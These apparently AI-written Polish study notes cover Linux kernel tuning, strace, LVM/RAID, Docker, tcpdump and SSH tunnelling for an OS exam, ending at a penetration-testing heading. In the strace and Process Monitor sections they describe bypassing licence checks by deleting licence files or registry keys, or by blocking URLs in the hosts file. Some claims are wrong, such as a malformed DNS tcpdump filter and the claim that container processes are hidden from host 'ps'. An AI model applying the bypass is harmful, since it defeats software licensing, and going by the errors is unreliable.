Jasne, przygotuję dla Ciebie kompleksową notatkę, która pomoże Ci w nauce do kolokwium z Dedykowanych Systemów Operacyjnych. Skupimy się na kluczowych pojęciach, komendach, ich zastosowaniach oraz odpowiedziach na pytania zawarte w materiałach laboratoryjnych.

---

### Notatka do Kolokwium: Dedykowane Systemy Operacyjne

Niniejsza notatka zawiera najważniejsze informacje z materiałów laboratoryjnych, zorganizowane tematycznie, aby ułatwić przygotowanie do kolokwium w formie pytań ABCD.

---

### 1. Podstawy Linuxa i narzędzia ogólne

#### A. Rola jądra Linuxa i zarządzanie nim
*   **Jądro (Kernel)**: Serce systemu operacyjnego, pośredniczy między aplikacjami użytkownika a sprzętem i pamięcią. Działa w **trybie jądra (kernel mode)**, komunikując się ze sprzętem, oraz **trybie użytkownika (user mode)** dla aplikacji. Komputer przełącza się na tryb jądra podczas **wywołań systemowych (system calls)** lub przerwań.
*   **Zarządzanie pamięcią**: Jądro przypisuje obszary pamięci fizycznej i swapu procesom. **Pamięć wirtualna** wykorzystuje część dysku jako rozszerzenie pamięci fizycznej (obszar wymiany/swap). Operacja nazywana **swapowaniem** jest w istocie **stronicowaniem**, czyli szybszym zapisywaniem bloków pamięci na dysku.
    *   **`free`**: Wyświetla informacje o wolnej pamięci. Wywołanie `sync; echo 3 > /proc/sys/vm/drop_caches` czyści cache, co może zmienić wynik `free`, pokazując więcej "dostępnej" pamięci, ale niekoniecznie zwiększając `free` pamięć fizyczną.
    *   **`dmesg`**: Wyświetla komunikaty z bufora jądra, gdzie można znaleźć informacje o działaniu programów i błędach, np. związanych z pamięcią.
    *   **`/proc/sys/vm/overcommit_memory`**: Parametr jądra kontrolujący przydział pamięci.
        *   Wartości `0` (heuristic overcommit) i `1` (always overcommit) pozwalają programom na rezerwację pamięci wirtualnej ponad dostępną pamięć fizyczną i swap (tzw. overcommit). Różnica jest taka, że `0` będzie bardziej ostrożne, a `1` zawsze pozwoli na overcommit, dopóki jądro nie uzna, że jest to niemożliwe.
        *   Wartość `2` (never overcommit) uniemożliwia overcommit; alokacja pamięci wirtualnej jest sprawdzana na bieżąco względem dostępnej pamięci fizycznej i swapu. Programy `alloc_*` będą w stanie zarezerwować tylko tyle pamięci, ile fizycznie dostępnej plus swap. Przekroczenie limitu może spowodować zawieszenie maszyny.
    *   **`/proc/sys/vm/overcommit_ratio`**: Określa procent pamięci fizycznej, który może być "przealokowany" (overcommitted).
*   **Sterowniki urządzeń**: Na najniższym poziomie jądra, mogą być dynamicznie ładowane/odładowywane. Udostępniają standardowy interfejs dla jądra.
*   **Zarządzanie procesami**: Każdy uruchomiony program to proces, zarządzany przez jądro. Jądro alokuje strukturę `task_struct` dla każdego procesu (z wyjątkiem `init`, który startuje z systemem). Ograniczeniem ilości procesów jest dostępna pamięć.
    *   **`sysctl`**: Polecenie do dynamicznej zmiany parametrów jądra "w locie". Zmiany są natychmiastowe.
    *   **`/etc/sysctl.conf`**: Plik, z którego wartości `sysctl` są wczytywane przy starcie systemu.
    *   **`/proc/sys`**: Katalog, który również dostarcza interfejs do parametrów `sysctl`, umożliwiając ich przeglądanie i modyfikację.
    *   **`/proc/<PID>`**: Katalogi w systemie plików `/proc`, gdzie `<PID>` to identyfikator procesu. Zawierają informacje o procesie o danym PID (np. jego stan, użycie pamięci, otwarte pliki).
*   **Moduły jądra**: Jądro Linuxa jest monolityczne z ładowalnymi modułami. Moduły rozszerzają funkcjonalność jądra i mogą być ładowane/wyładowywane w trakcie działania systemu, oszczędzając pamięć RAM.
    *   Moduł musi zawierać procedury wejścia i wyjścia.
    *   **`insmod`**: Ładuje moduł jądra (plik `.ko`).
    *   **`rmmod`**: Usuwa moduł jądra.
    *   **`modprobe`**: Jest bardziej zaawansowany niż `insmod`/`rmmod`. Potrafi automatycznie rozwiązywać zależności modułów i ładować/usuwać je wraz z potrzebnymi zależnościami.
    *   **`lsmod`**: Wyświetla listę załadowanych modułów jądra.
    *   Wyniki pracy modułu mogą być widoczne w logach jądra (`dmesg`) lub poprzez utworzone przez moduł wpisy w `/proc`.
    *   Procesy widoczne w `/proc` i przez `ps` to te same procesy, `ps` agreguje i formatuje dane z `/proc`.

#### B. Śledzenie programów (`strace`, Process Monitor)
*   **`strace` (Linux)**: Narzędzie do śledzenia wywołań systemowych i sygnałów programu. Pomaga zrozumieć, jak program wchodzi w interakcje z jądrem i systemem.
    *   **Zastosowanie**: Analiza przyczyn nieprawidłowego działania aplikacji.
    *   **Parametry**:
        *   `strace ./program_secure`: Ogólna analiza.
        *   `strace -o output.txt ./program_secure`: Zapis analizy do pliku.
        *   `strace -e trace=openat/file/network`: Filtrowanie wyników (np. dostęp do plików, wywołania sieciowe).
        *   `strace -f`: Podążanie za procesami potomnymi.
        *   `strace -yy -s 100 -v`: Wyświetla nazwy plików, błędy, pełne ciągi znaków.
    *   **Elementy do analizy**: odczytywane ścieżki (`openat`, `stat`, `read`), dostępy do plików, czas (`gettimeofday`, `clock_gettime`), wywołania sieciowe (`connect`, `recvfrom`).
    *   **Wnioski po analizie**:
        *   Zabezpieczenia programu można obejść poprzez manipulację plikami (np. usuwanie plików licencyjnych/logów czasu) lub blokowanie dostępu do URL (np. poprzez `/etc/hosts`).
        *   Programy często zapisują dane lokalnie (np. pliki licencyjne, logi).
        *   Brak połączenia z internetem może uniemożliwić programowi weryfikację licencji online, co może spowodować jego błędne działanie lub brak uruchomienia.
*   **Process Monitor (Windows)**: Narzędzie do monitorowania aktywności plików, rejestru i sieci w systemie Windows.
    *   **Elementy do analizy**: Dostęp do pliku (`CreateFile`, `ReadFile`, `WriteFile`), dostęp do rejestru (`RegQueryValue`, `RegSetValue`, `RegCreateKey`), połączenia sieciowe (`TCP Connect` lub `Send`).
    *   **Wnioski po analizie**:
        *   Podobnie jak w `strace`, można obejść zabezpieczenia poprzez usunięcie/modyfikację plików licencyjnych, kluczy rejestru lub blokowanie URL (np. w `C:\Windows\System32\drivers\etc\hosts`).
        *   Plik logu można zapisać do późniejszej analizy (format PML).
        *   Opcja Highlight (Ctrl+H) służy do wyróżniania wpisów spełniających określone kryteria.

---

### 2. Zarządzanie dyskami LVM i RAID

#### A. LVM (Logical Volume Manager)
*   **Definicja**: Warstwa abstrakcji między fizycznymi nośnikami danych a systemem plików, umożliwiająca elastyczne zarządzanie przestrzenią dyskową. Pozwala łączyć wiele fizycznych nośników w jedną spójną przestrzeń i dynamicznie ją przydzielać.
*   **Tradycyjne partycjonowanie vs. LVM**:
    *   **Tradycyjne**: Statyczne partycjonowanie, ustalony rozmiar partycji, zmiana rozmiaru jest skomplikowana/ryzykowna. Brak łatwej relokacji niewykorzystanej przestrzeni między partycjami.
    *   **LVM**: Elastyczność, łatwe rozszerzanie/zmniejszanie wolumenów logicznych bez restartu systemu (dla rozszerzania) czy utraty danych. Agregacja przestrzeni z wielu dysków.
*   **Główne elementy LVM**:
    *   **PV (Physical Volume)**: Fizyczne nośniki danych (dyski, partycje) oznaczone jako należące do LVM. Tworzone za pomocą `pvcreate`.
    *   **VG (Volume Group)**: Grupa wolumenów, logiczna przestrzeń zbudowana z jednego lub więcej PV. Działa jak kontener. Tworzone za pomocą `vgcreate`. 1 PV może należeć tylko do 1 VG.
    *   **LV (Logical Volume)**: Odpowiednik tradycyjnych partycji, które system widzi jako przestrzeń do montowania systemów plików. Dowolnie tworzone, rozszerzane, usuwane w ramach VG. Tworzone za pomocą `lvcreate`.
    *   **PE (Physical Extents)**: Jednostki logiczne, z dokładnością do których LVM podaje rozmiary przestrzeni (domyślnie 4 MB).
*   **Warstwowa struktura LVM**: Dysk fizyczny -> PV -> VG -> LV -> System plików -> Dane użytkownika.
*   **Korzyści z LVM**:
    *   **Elastyczność**: Łatwe rozszerzanie/zmniejszanie LV.
    *   **Agregacja przestrzeni**: Łączenie wielu dysków w jedną grupę.
    *   **Snapshoty (migawki)**: Tworzenie kopii danych w określonym momencie, przydatne do backupów/testowania. Tworzone za pomocą `lvcreate -s`. Przywracanie migawki: `lvconvert --merge`.
    *   **Migracja danych**: Przenoszenie danych między dyskami bez zatrzymywania systemu (`pvmove`).
    *   **Cienkie przydzielanie (thin provisioning)**: LV logicznie mają określony rozmiar, ale fizycznie używają mniej miejsca. Wymaga monitorowania, aby uniknąć uszkodzenia wolumenów po przekroczeniu fizycznej pojemności. Tworzone za pomocą `lvcreate --type thin-pool` (pula) i `lvcreate -V --thin` (cienki wolumen).
    *   **Tagowanie i filtrowanie**: Oznaczanie i wyszukiwanie wolumenów (`lvchange --addtag`, `lvs --select`).
    *   **Szyfrowanie**: Z LUKS, struktura: fizyczny dysk → LUKS zaszyfrowany kontener → LVM: VG → LV → system plików.
*   **Kiedy stosować/nie stosować LVM**:
    *   **Tak**: Gdy potrzeby przestrzeni dynamicznie się zmieniają, nie wiadomo ile miejsca będzie potrzeba, częste backupy/testowanie, zarządzanie wieloma dyskami, środowisko produkcyjne nie może być zatrzymywane.
    *   **Nie**: W prostych systemach (komputery domowe), wymaga większej wiedzy administracyjnej, niektóre narzędzia do odzyskiwania danych mogą nie obsługiwać LVM.
*   **LVM w systemach operacyjnych**:
    *   **Domyślnie**: RHEL, CentOS, AlmaLinux, Rocky Linux, Fedora (do wersji 33-34), SLES, openSUSE.
    *   **Opcjonalnie**: Ubuntu, Debian.
    *   **Nie używają (własne rozwiązania)**: Windows (Dynamic Disks, Storage Spaces), macOS (APFS Containers).
*   **Różnica LVM od systemu plików**: LVM zarządza jak i skąd przestrzeń dyskowa jest udostępniana. System plików zarządza, jak dane są przechowywane i odczytywane na tej przestrzeni.

#### B. RAID (Redundant Array of Independent Disks)
*   **Definicja**: Technika łączenia wielu fizycznych dysków w jedną logiczną jednostkę dla zwiększenia wydajności, niezawodności i pojemności.
*   **Poziomy RAID (wybrane)**:
    *   **RAID 0 (Striping)**: Min. 2 dyski. Brak nadmiarowości, brak ochrony przed awarią. 100% dostępnej przestrzeni. Bardzo szybki. Dane dzielone między dyski blok po bloku.
    *   **RAID 1 (Mirroring)**: Min. 2 dyski. Pełna nadmiarowość (kopie 1:1), ochrona przed awarią 1 dysku. 50% dostępnej przestrzeni. Szybki odczyt. Każdy dysk ma identyczną kopię.
        *   **Pytanie**: `lvcreate --type raid1 -m1 -L 4G -n lv_mirror lab_vg` się nie udało, mimo że było wolne miejsce. Może to być spowodowane brakiem wystarczającej liczby fizycznych wolumenów (PV) do stworzenia lustra (np. jeśli dostępne PV były już częściowo zajęte lub niewystarczające, aby zapewnić symetryczne rozmieszczenie danych dla lustra).
    *   **RAID 5**: Min. 3 dyski. Rozdzielona parzystość, ochrona przed awarią 1 dysku. ~66-80% dostępnej przestrzeni. Dobry odczyt. Striping + rozproszona parzystość.
*   **Tradycyjny RAID (mdadm) vs. RAID w LVM**:
    *   **Tradycyjny RAID (mdadm)**: Działa bezpośrednio na urządzeniach blokowych. Konfiguracja manualna (`mdadm`). Mniejsza elastyczność.
    *   **RAID w LVM**: Działa na poziomie wolumenów logicznych LVM. Konfiguracja zintegrowana z LVM (`lvcreate --type raidX`). Większa elastyczność dzięki integracji z LVM (`pvmove`). Konfiguracja automatycznie zapisywana w metadanych LVM.
    *   Można używać tradycyjnego RAID jako PV dla LVM (`RAID -> LVM`). LVM może również tworzyć wolumeny RAID bezpośrednio (`PV -> VG -> LV (RAID)`).

---

### 3. Docker: Konteneryzacja

#### A. Instalacja i podstawowe operacje
*   **Instalacja**: Wymaga `ca-certificates` i `curl`, dodania kluczy GPG i repozytorium Dockera, a następnie instalacji pakietów `docker-ce`, `docker-ce-cli`, `containerd.io`, `docker-buildx-plugin`, `docker-compose-plugin`.
*   **Sprawdzenie działania**: `sudo systemctl status docker` (pokazuje status usługi, np. Main PID). `sudo docker run hello-world` (pobiera i uruchamia prosty kontener).
    *   **Pytanie**: Procesem odpowiadającym za usługę Docker jest `dockerd`, a jego PID to "Main PID" przy statusie.
    *   **Pytanie**: Obraz `hello-world` zazwyczaj nie znajduje się w lokalnym repozytorium przy pierwszym uruchomieniu i jest pobierany z Docker Hub.

#### B. Zarządzanie obrazami
*   **`sudo docker pull <obraz>[:tag]`**: Pobieranie obrazów.
    *   **Pytanie**: Ponowne pobranie obrazu `debian` lub `debian:latest` zazwyczaj nie powoduje ponownego pobrania, jeśli obraz o danym tagu (lub `latest`) jest już lokalnie dostępny. Świadczy to o tym, że Docker zarządza lokalnymi kopiami obrazów i pobiera tylko te, których brakuje lub są nowsze.
*   **`sudo docker image ls`**: Wyświetla listę lokalnych obrazów.
    *   **Pytanie**: `IMAGE_ID` jest unikalnym identyfikatorem obrazu. Jeśli `debian:latest` i `debian:bookworm` mają ten sam `IMAGE_ID`, oznacza to, że są to te same obrazy, tylko z różnymi tagami (np. `latest` wskazuje na `bookworm`).
    *   **Pytanie**: Obraz `hello-world` powinien znajdować się w repozytorium po jego uruchomieniu, ponieważ został pobrany.
*   **`sudo docker rmi <obraz>`**: Usuwa obraz.
    *   **Pytanie**: Polecenie `sudo docker rmi debian` usunie obraz o nazwie `debian` (domyślnie `debian:latest`), pod warunkiem, że nie jest używany przez żaden kontener.

#### C. Cykl życia kontenera
*   **`sudo docker run <obraz> <komenda>`**: Uruchamia nowy kontener.
    *   **Pytanie**: Różnica między `sudo /bin/echo "Hello world"` (na hoście) a `sudo docker run debian /bin/echo "Hello world"` (w kontenerze) polega na tym, że w drugim przypadku polecenie `echo` jest wykonywane w izolowanym środowisku kontenera, który jest uruchomiony na bazie obrazu Debiana.
    *   **Pytanie**: Różnica między `debian` a `alpine` polega na rozmiarze i bazowym systemie operacyjnym. Obraz `alpine` jest znacznie mniejszy (często kilkadziesiąt MB) i bazuje na BusyBoxie, podczas gdy `debian` jest większy i bazuje na pełnym systemie Debian. `docker images` pokazałoby ich rozmiary.
*   **`sudo docker run -it --hostname <nazwa> <obraz> <shell>`**: Uruchamia kontener w trybie interaktywnym (`-it`) z określoną nazwą hosta (`--hostname`) i uruchamia powłokę (np. `/bin/bash`).
    *   **Pytanie**:
        *   Domyślna struktura katalogów w kontenerze jest zbliżona do typowej struktury systemu Linux.
        *   Domyślnie w kontenerze uruchomiony jest tylko jeden główny proces (PID 1), który jest procesem startowym (np. `/bin/bash` w trybie interaktywnym).
        *   Polecenie `/bin/bash` ma PID 1, co świadczy o tym, że jest to główny proces kontenera.
        *   Wersja jądra w kontenerze i na hoście jest taka sama, ponieważ kontenery współdzielą jądro systemu hosta.
        *   Opis systemu operacyjnego w kontenerze (`cat /etc/os-release`) może być inny niż na hoście, ponieważ kontener używa innego (izolowanego) systemu plików.
*   **`sudo docker exec -it <CONTAINER_ID> /bin/bash`**: Podłączenie do istniejącego, uruchomionego kontenera.
    *   **Pytanie**:
        *   Tak, da się podłączyć do istniejącego kontenera za pomocą `docker exec`.
        *   Proces `bash` występuje pojedynczo w trybie interaktywnym, ponieważ jest to główny proces kontenera lub proces uruchomiony poprzez `docker exec`.
        *   Z poziomu hosta procesy w kontenerze nie są bezpośrednio widoczne w standardowym `ps aux`, ponieważ działają w izolowanej przestrzeni nazw procesów. Jednak można je zobaczyć używając `docker top <CONTAINER_ID>` lub narzędzi hosta, które analizują przestrzenie nazw.
        *   PID procesu `ping` będzie inny w kontenerze niż na hoście, ponieważ procesy kontenera mają swoją własną przestrzeń PID.
*   **`sudo docker run -d --name <nazwa> <obraz> <komenda>`**: Uruchamia kontener w trybie działającym w tle (`-d`, detached mode) z określoną nazwą (`--name`).
    *   **Pytanie**: Który kontener jest widoczny jako działający? Ten, który ma proces `top` działający w tle, ponieważ proces ten ciągle pracuje i nie kończy się.
    *   **Pytanie**: Jeżeli proces o PID=1 (główny proces kontenera działającego w tle) zakończy się, kontener również zostanie zatrzymany.
*   **`sudo docker ps` / `sudo docker ps -a`**: Wyświetla działające (`ps`) lub wszystkie (również zatrzymane, `-a`) kontenery.
*   **`sudo docker logs --tail <liczba> <nazwa_kontenera>`**: Wyświetla ostatnie linie standardowego wyjścia (STDOUT) kontenera.
    *   **Pytanie**: Tak, można przeglądać standardowe wyjście z kontenera (STDOUT) za pomocą `docker logs`.
    *   **Pytanie**: Bazowy obraz Debiana jest bardzo minimalistyczny i domyślnie nie posiada wielu standardowych poleceń administracyjnych (np. `procps`, `top`). Trzeba je doinstalować (`apt-get update && apt-get install -y procps`).
*   **`sudo docker stop <nazwa>` / `sudo docker start <nazwa>` / `sudo docker rm <nazwa>`**: Zatrzymuje, uruchamia lub usuwa kontener.
*   **`sudo docker run --rm ubuntu`**: Uruchamia kontener, który zostanie automatycznie usunięty po zakończeniu działania (`--rm`).
    *   **Pytanie**: Kontenery po zakończeniu pracy nie są domyślnie usuwane (pozostają w stanie `Exited`), chyba że użyto flagi `--rm`.
    *   **Pytanie**: Tak, można uruchomić kontener, który zostanie automatycznie usunięty po zakończeniu działania, używając flagi `--rm`.
    *   **Pytanie**: Jeśli nie poda się nazwy podczas tworzenia kontenera, Docker przypisze mu losową, unikalną nazwę.
    *   **Pytanie**: Kontener uruchomiony poleceniem `docker start` zostanie uruchomiony z tą samą komendą (`COMMAND`), z którą został stworzony (`docker run`).

#### D. Woluminy (Volumes)
*   **Typy woluminów**:
    *   **Woluminy nazwane/anonimowe (Docker Managed Volumes)**: Zarządzane przez Dockera, dane persystują nawet po usunięciu kontenera, chyba że wolumin zostanie jawnie usunięty.
        *   **Pytanie**: `sudo docker run -v /mykontdata --name kont ...` tworzy anonimowy wolumin (lub nazwany, jeśli podamy mu nazwę). Ścieżka do woluminu w kontenerze to `/mykontdata`. Na hoście ścieżka do woluminu jest w katalogu `/var/lib/docker/volumes/<id_woluminu>/_data` i można ją sprawdzić poleceniem `sudo docker inspect -f '{{ json .Mounts }}' kont`.
        *   **Pytanie**: Tak, plik zapisany w kontenerze (`plik.txt`) został zapisany w katalogu woluminu na hoście.
        *   **Pytanie**: Tak, po usunięciu kontenera (`docker rm kont`) plik w woluminie pozostał, ponieważ woluminy są niezależne od cyklu życia kontenera.
    *   **Bind Mounts (Montowanie wiązane)**: Montują katalog z systemu hosta bezpośrednio do kontenera.
        *   **Pytanie**: Katalog na hoście (np. `/home/data`) nie jest tworzony automatycznie podczas tworzenia kontenera za pierwszym razem z bind mount, musi istnieć wcześniej, inaczej Docker może go utworzyć jako katalog, ale to nie to samo co istniejący katalog hosta z danymi.
        *   **Pytanie**: Różnica między `--mount type=bind,source=/home/data,target=/mykontdata` a `-v /home/data:/mykontdata`: `bind` jest nowszą składnią i jest bardziej szczegółowa, pozwala na określenie typu montowania, podczas gdy `-v` jest starszą, skróconą składnią. Ich funkcjonalność dla bind mountów jest w dużej mierze podobna.
        *   **Pytanie**: W obu przypadkach (`--mount` i `-v`) katalog docelowy w kontenerze (`/var`) został nadpisany zawartością z hosta z katalogu `/tmp`, co oznacza, że kontener widzi zawartość `/tmp` hosta w swoim `/var`.
    *   **Kontenery danych (Data Containers)**: Stary sposób zarządzania woluminami, gdzie dane były przechowywane w specjalnym kontenerze, a inne kontenery montowały z niego woluminy za pomocą `--volumes-from`.
        *   **Pytanie**: Dla wolumenu nazwanego (`docker volume create mynamedvol`) nie jest domyślnie tworzony kontener, a jedynie sam wolumin.
        *   **Pytanie**: Przewaga zarządzania woluminem nazwanym względem kontenera danych to większa prostota i mniejsza złożoność konfiguracji. Wolumeny nazwane są zarządzane bezpośrednio przez Dockera, są łatwiejsze do śledzenia i użycia, a nie wymagają utrzymywania "martwego" kontenera tylko do przechowywania danych.

#### E. Sieci kontenerów
*   **Domyślne sieci Docker**:
    *   **`bridge`**: Domyślna sieć dla kontenerów. Tworzy wirtualny most, do którego podłączane są interfejsy `veth` kontenerów. Pozwala na dostęp do sieci zewnętrznej (Internetu) poprzez NAT. Zapewnia izolację między hostem a kontenerem, porty hosta nie są domyślnie wspólne, ale mogą być mapowane (`-p`).
        *   **Pytanie**: Uruchomiony kontener ma przypisaną sieć (`bridge`). Podczas tworzenia kontenera tworzony jest dla niego interfejs sieciowy typu `veth`. Jest on podłączony do interfejsu hosta (`docker0` lub inna nazwa mostu z `com.docker.network.bridge.name`). Kontener jest domyślnie podpinany pod sieć `bridge`.
        *   **Pytanie**: Na domyślnej sieci `bridge`, `ping box2` (po nazwie) zazwyczaj się nie udaje, ponieważ domyślna sieć nie posiada wewnętrznego serwera DNS do rozwiązywania nazw kontenerów. `ping <ADRES_IP_BOX2>` (po adresie IP) powinien się udać.
        *   **Pytanie**: Dla sieci `bridge` można mapować/przekierować port hosta na port kontenera (`-p 8080:80`).
    *   **`host`**: Kontener współdzieli przestrzeń sieciową z hostem, czyli jego porty są takie same jak porty hosta. Nie ma izolacji. Pozwala na dostęp do sieci zewnętrznej. Porty hosta są wspólne dla wszystkich kontenerów działających w sieci `host`.
        *   **Pytanie**: Kontener w sieci `host` może mieć status `Exited` z błędem, jeśli próbuje uruchomić usługę na porcie już zajętym przez hosta lub inny kontener w sieci `host`, ponieważ dzieli zasoby sieciowe z hostem.
    *   **`none`**: Kontener nie ma żadnych interfejsów sieciowych (jest izolowany). Nie pozwala na dostęp do sieci zewnętrznej.
*   **Użytkownika zdefiniowane sieci (user-defined networks)**: Lepsze niż domyślny bridge, ponieważ posiadają wbudowany wewnętrzny DNS, który pozwala na komunikację między kontenerami po ich nazwach.
    *   **Pytanie**: `sudo docker network create siecbrigde` tworzy niestandardową sieć bridge.
    *   **Pytanie**: Tak, tym razem (`ping box4` na niestandardowej sieci) udało się spingować kontener po nazwie, i ping działa w obie strony. Wewnętrzny DNS jest tworzony na tych sieciach (`nameserver 127.0.0.X`).
*   **Dynamiczne przełączanie sieci**: Sieci `bridge` i `none` można dynamicznie odłączać i podłączać (`docker network disconnect`, `docker network connect`). Sieć `host` nie może być dynamicznie przełączana.
*   **Komunikacja między kontenerami z różnych sieci**: Kontener może być podłączony do wielu sieci jednocześnie.
    *   **Pytanie**: Jeśli kontener jest w dwóch sieciach, możliwa jest komunikacja po nazwie (jeśli sieci wspierają DNS) oraz po adresie IP.

#### F. Tworzenie obrazów (Dockerfile) i repozytoria
*   **Dockerfile**: Plik tekstowy z instrukcjami do budowania obrazu Docker.
    *   **Instrukcje**:
        *   `FROM`: Bazowy obraz.
        *   `RUN`: Wykonuje komendy w trakcie budowania obrazu (np. instalacja pakietów). Ma największy wpływ na rozmiar obrazu.
        *   `ADD` / `COPY`: Kopiuje pliki z hosta do obrazu.
        *   `WORKDIR`: Ustawia katalog roboczy.
        *   `EXPOSE`: Deklaruje porty, na których kontener nasłuchuje (dokumentacja, nie publikuje).
        *   `CMD`: Określa domyślną komendę do uruchomienia po starcie kontenera. Może być nadpisana przez komendę podaną w `docker run`.
            *   **Pytanie**: Daje możliwość zdefiniowania domyślnego polecenia uruchamianego, gdy kontener startuje bez podanej jawnie komendy. Wynik skryptu jest zwrócony do konsoli, gdy komenda `CMD` zostanie wykonana automatycznie lub gdy skrypt zostanie wywołany jawnie (`python hello.py`).
    *   **`docker build -t <nazwa>:<tag> .`**: Buduje obraz na podstawie Dockerfile w bieżącym katalogu.
    *   **`docker history <obraz>`**: Pokazuje historię warstw obrazu i rozmiar każdej z nich.
    *   **Pytanie**: Zbudowany obraz `alpine:mymod` nie zastąpił oryginalnego obrazu `alpine` w repozytorium, ale stworzył nowy obraz. Rozmiar `alpine:mymod` zmienił się o rozmiar zainstalowanych pakietów (np. `python3`) i dodanych plików. Polecenie `RUN apk add python3` miało największy wpływ na rozmiar.
*   **Eksport/Import obrazów**:
    *   **`sudo docker save -o <plik.tar> <obraz>`**: Eksportuje obraz do pliku `.tar`.
    *   **`sudo docker load -i <plik.tar>`**: Importuje obraz z pliku `.tar`.
    *   **Pytanie**: Zaimportowany obraz ma ten sam identyfikator obrazu (`IMAGE_ID`), co oznacza, że jest to identyczna kopia tego samego obrazu, a nie nowy obraz.
*   **Tworzenie obrazu na bazie kontenera**:
    *   **`sudo docker commit <nazwa_kontenera> <nowy_obraz>`**: Tworzy nowy obraz na podstawie zmian dokonanych w istniejącym kontenerze.
    *   **Pytanie**: Plik utworzony w kontenerze (`pliczek.txt`) został zachowany w nowym obrazie. Polecenie wykonane w kontenerze (np. `apk add bash`) zostało zachowane w nowym obrazie, ponieważ obraz zawiera wszystkie zmiany w systemie plików kontenera. Nowy obraz jest widoczny w repozytorium obrazów pod podaną nazwą.
*   **Własne repozytorium (registry)**:
    *   **`sudo docker run -d -p 5000:5000 --restart=always --name registry registry:2`**: Uruchamia lokalne repozytorium Docker jako kontener.
    *   **Pytanie**: Tak, uruchomione repozytorium na obrazy jest kontenerem. Domyślnie nic się w nim nie znajduje, dopóki obrazy nie zostaną wypchnięte.
    *   **`sudo docker tag <źródło> <cel>`**: Taguje obraz (np. do wypchnięcia do repozytorium lokalnego).
    *   **`sudo docker push <obraz>`**: Wypycha obraz do repozytorium.
    *   **Pytanie**: Usunięcie obrazu z lokalnego repozytorium systemu (`docker rmi`) nie powoduje usunięcia go z repozytorium sieciowego.
    *   **Pytanie**: Składowanie obrazów w prywatnym repozytorium sieciowym pozwala na centralne zarządzanie i dystrybucję obrazów wewnątrz organizacji, bez konieczności polegania na zewnętrznym Docker Hub, co zwiększa bezpieczeństwo i kontrolę.

#### G. Docker Compose
*   **`docker-compose.yaml`**: Plik YAML do definiowania i uruchamiania wielokontenerowych aplikacji Docker. Definiuje usługi (kontenery), ich budowanie/obrazy, porty, zmienne środowiskowe, zależności (`depends_on`) i woluminy.
*   **`.env`**: Plik do przechowywania zmiennych środowiskowych, które mogą być używane w `docker-compose.yaml`.
*   **`sudo docker compose up --build`**: Buduje obrazy (jeśli zdefiniowano `build` w `docker-compose.yaml`) i uruchamia wszystkie usługi zdefiniowane w pliku, w trybie foreground.
*   **`sudo docker compose up -d`**: Uruchamia usługi w tle (detached mode).

---

### 4. Sieci zaawansowane i SSH

#### A. Przechwytywanie i analiza ruchu (`tcpdump`, `ss`, `netcat`)
*   **`tcpdump`**: Narzędzie do przechwytywania i analizowania ruchu sieciowego.
    *   **Parametry**:
        *   `-D` / `--list-interface`: Wyświetla listę wszystkich interfejsów sieciowych.
        *   `-i <iface>`: Przechwytuje ruch na wybranym interfejsie.
        *   `-nn`: Nie konwertuje adresów IP na nazwy hostów i portów na nazwy usług (szybsze).
        *   `-vv` / `-vvv`: Bardziej szczegółowe wyświetlanie pakietów.
        *   `-w <plik.pcap>`: Zapisuje przechwycony ruch do pliku.
        *   `-t` / `-tt` / `-ttt` / `-tttt` / `-ttttt`: Różne formaty wyświetlania czasu.
    *   **Filtrowanie**:
        *   `net <podsieć>`: Ruch w wybranej podsieci.
        *   `port <numer>`: Ruch na wybranym porcie (np. `port 80` dla HTTP, `port 53` dla DNS).
        *   `host <adres_IP>`: Cały ruch do/z jednego hosta.
        *   `icmp`: Filtrowanie ruchu protokołu ICMP.
        *   `dst <adres_IP>`: Ruch skierowany do konkretnego adresu.
        *   `tcp dst port 22 and tcp[tcpflags] & tcp-syn != 0`: Może być pomocne do identyfikacji ataku brute force na SSH, ponieważ pokazuje próby nawiązania połączenia TCP na porcie 22.
        *   `udp & 0x8000 = 0`: Przechwytuje tylko zapytania DNS (flaga `QR` w nagłówku DNS ustawiona na 0).
    *   **Różnica w filtrach**: `tcpdump -i enp0s3 port 53 and udp or tcp` vs. `tcpdump -i enp0s3 port 53 and '(udp or tcp)'` - nawiasy zmieniają kolejność operacji logicznych. Bez nawiasów `and` ma wyższy priorytet niż `or`. Drugie polecenie poprawnie filtruje ruch na porcie 53, który jest UDP lub TCP.
*   **`ss` (Socket Statistics)**: Narzędzie do wyświetlania informacji o gniazdach (socketach), szybsze i bardziej rozbudowane niż `netstat`.
    *   **Parametry**:
        *   `-t`: Wyświetla wszystkie połączenia TCP.
        *   `-a`: Wyświetla wszystkie (nasłuchujące i nienasłuchujące).
        *   `-l`: Wyświetla gniazda w stanie nasłuchiwania.
        *   `-n`: Wyświetla numery portów i adresy IP w postaci numerycznej (bez konwersji na nazwy).
    *   **Zastosowanie**: Znajdowanie PID procesu nasłuchującego na porcie. Monitorowanie nowych połączeń (`watch -n 1 'ss -tan'`). Odkrywanie niestandardowych otwartych portów. Identyfikowanie zablokowanych połączeń TCP (np. `SYN-SENT`, `CLOSE-WAIT`).
*   **`ncat` (netcat)**: Uniwersalne narzędzie do skanowania portów, nasłuchiwania, przesyłania danych i tworzenia prostych serwerów/klientów TCP/UDP.

#### B. Przekierowywanie portów SSH
*   **Konfiguracja maszyny wirtualnej do pracy grupowej**: `Attached to: Bridged`, `Promiscuous Mode: Allow All`.
*   **Lokalne przekierowanie portów (`-L`)**:
    *   `ssh sysop@<IP_Z> -L 8888:<IP_X>:12345`.
    *   **Kierunek**: Local -> Remote.
    *   **Zastosowanie**: Dostęp do zdalnej usługi poprzez `localhost`.
    *   **Pytanie**: Adres IP połączenia przychodzącego na X, gdy Y łączy się przez tunel SSH (Z), będzie adresem IP maszyny Z (serwera SSH), a nie Y. To jest zmiana w porównaniu do bezpośredniego połączenia (gdzie byłoby IP Y).
*   **Dynamiczne przekierowanie portów (`-D`) - SOCKS proxy**:
    *   `ssh sysop@<IP_Z> -D 9999`.
    *   **Kierunek**: Local -> Remote (SOCKS).
    *   **Zastosowanie**: Użycie SSH jako ogólnego proxy (SOCKS5).
    *   **Pytanie**: Adres IP połączenia przychodzącego na X, gdy Y łączy się przez SOCKS proxy (Z), będzie adresem IP maszyny Z (serwera SSH), a nie Y. To jest zmiana w porównaniu do bezpośredniego połączenia.
    *   **Pytanie (curl przez proxy)**: Ruch HTTP nie będzie widoczny na maszynie Y, ponieważ Y wysyła ruch przez tunel SSH do Z. Ruch HTTP będzie widoczny na Z (serwerze SSH) i na X (jeśli X jest docelowym serwerem HTTP). Adres IP ruchu na X będzie pochodził z Z.

---

### 5. Testy penetracyjne

#### A. Podstawowe definicje i typy pentestów
